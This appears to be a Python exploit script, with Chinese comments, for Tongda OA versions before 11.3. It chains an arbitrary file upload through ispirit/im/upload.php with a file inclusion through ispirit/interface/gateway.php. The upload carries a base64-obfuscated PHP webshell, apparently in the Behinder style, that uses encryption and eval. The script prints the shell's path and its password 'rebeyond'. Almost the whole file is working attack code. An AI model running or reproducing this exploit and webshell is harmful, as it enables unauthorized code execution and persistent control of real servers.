import requests
import base64
import time
import re

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'

def file_include_upload(host,ext_name_1,ext_name_2,content): # 配合<11.3包含上传的文件getshell
    print(CYAN + '[->] 正在尝试包含上传的图片文件' + '\n' + END)
    url = host + 'ispirit/interface/gateway.php'
    try:
        data = {'json':"{\"url\":\"general/../../attach/im/%s/%s.jpg\"}" % (ext_name_1,ext_name_2)}
        # print(data)
        response = requests.post(url=url,data=data,timeout=2)
        if response.status_code == 200 and '' in response.text:
            content += '[*] 文件包含图片成功,webshell路径如下:' + '\n'
            content += host + 'ispirit/interface/sh3ll.php' + '\n'
            content += 'webshell密码为rebeyond' + '\r\n'
            print(GREEN + content + END)
            return content
        else:
            content += '[-] 不存在文件包含漏洞' + '\r\n'
            print(RED + content + END)
            return content
    except:
        pass

def fileUpload(host): # 通达<11.3任意文件上传 结合
    print(CYAN + "[->] 正在测试是否存在<11.3任意文件上传漏洞" + END)
    content = ''
    url = host + 'ispirit/im/upload.php'
    try:
        headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3'}
        data = base64.b64decode('LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5QndWQXdWM080c2lmeWhyMw0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJVUExPQURfTU9ERSINCg0KMg0KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5QndWQXdWM080c2lmeWhyMw0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJQIg0KDQoNCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iREVTVF9VSUQiDQoNCjENCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeUJ3VkF3VjNPNHNpZnlocjMNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iQVRUQUNITUVOVCI7IGZpbGVuYW1lPSJqcGciDQpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcNCg0KPD9waHANCiRmcCA9IGZvcGVuKCdzaDNsbC5waHAnLCAndycpOw0KJGEgPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBS1FHVnljbTl5WDNKbGNHOXlkR2x1Wnlnd0tUc0tjMlZ6YzJsdmJsOXpkR0Z5ZENncE93b2dJQ0FnSkd0bGVUMGlaVFExWlRNeU9XWmxZalZrT1RJMVlpSTdJQzh2NksrbDVhK0c2WktsNUxpNjZMK2U1bzZsNWErRzU2Q0JNekxrdlkxdFpEWGxnTHpubW9UbGlZMHhOdVM5amUrOGpPbTdtT2l1cE9pL251YU9wZVd2aHVlZ2dYSmxZbVY1YjI1a0Nna2tYMU5GVTFOSlQwNWJKMnNuWFQwa2EyVjVPd29KYzJWemMybHZibDkzY21sMFpWOWpiRzl6WlNncE93b0pKSEJ2YzNROVptbHNaVjluWlhSZlkyOXVkR1Z1ZEhNb0luQm9jRG92TDJsdWNIVjBJaWs3Q2dscFppZ2haWGgwWlc1emFXOXVYMnh2WVdSbFpDZ25iM0JsYm5OemJDY3BLUW9KZXdvSkNTUjBQU0ppWVhObE5qUmZJaTRpWkdWamIyUmxJanNLQ1Fra2NHOXpkRDBrZENna2NHOXpkQzRpSWlrN0Nna0pDZ2tKWm05eUtDUnBQVEE3SkdrOGMzUnliR1Z1S0NSd2IzTjBLVHNrYVNzcktTQjdDaUFnSUNBSkNRa2dKSEJ2YzNSYkpHbGRJRDBnSkhCdmMzUmJKR2xkWGlSclpYbGJKR2tyTVNZeE5WMDdJQW9nSUNBZ0NRa0pmUW9KZlFvSlpXeHpaUW9KZXdvSkNTUndiM04wUFc5d1pXNXpjMnhmWkdWamNubHdkQ2drY0c5emRDd2dJa0ZGVXpFeU9DSXNJQ1JyWlhrcE93b0pmUW9nSUNBZ0pHRnljajFsZUhCc2IyUmxLQ2Q4Snl3a2NHOXpkQ2s3Q2lBZ0lDQWtablZ1WXowa1lYSnlXekJkT3dvZ0lDQWdKSEJoY21GdGN6MGtZWEp5V3pGZE93b0pZMnhoYzNNZ1EzdHdkV0pzYVdNZ1puVnVZM1JwYjI0Z1gxOXBiblp2YTJVb0pIQXBJSHRsZG1Gc0tDUndMaUlpS1R0OWZRb2dJQ0FnUUdOaGJHeGZkWE5sY2w5bWRXNWpLRzVsZHlCREtDa3NKSEJoY21GdGN5azdDajgrQ2c9PSIpOw0KZndyaXRlKCRmcCwgJGEpOw0KZmNsb3NlKCRmcCk7DQo/Pg0KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5QndWQXdWM080c2lmeWhyMy0t')
        response = requests.post(url=url,data=data,headers=headers,timeout=2)
        # print(response.text)
        if 'OK' in response.text:
            content += '[*] 图片上传成功，正在尝试文件包含图片\n'
            pattern_ext2 = re.compile('\_(.*?)\|',re.S)
            pattern_ext1 = re.compile('\@(.*?)\_',re.S)
            ext_name_2 = re.findall(pattern_ext2,response.text)[0]
            ext_name_1 = re.findall(pattern_ext1,response.text)[0]
            # print("图片名称为：",ext_name_2)
            # print("目录名称为：",ext_name_1)  # 获取目录名和图片名
            content = file_include_upload(host,ext_name_1,ext_name_2,content)
            return content
        else:
            content += '[-] 不存在通达<11.3任意文件上传' + '\r\n'
            print(RED + content + END)
            return content
    except:
        print(RED + "[-] 文件上传检测失败\n" + END)

def run(host):
    fileUpload(host)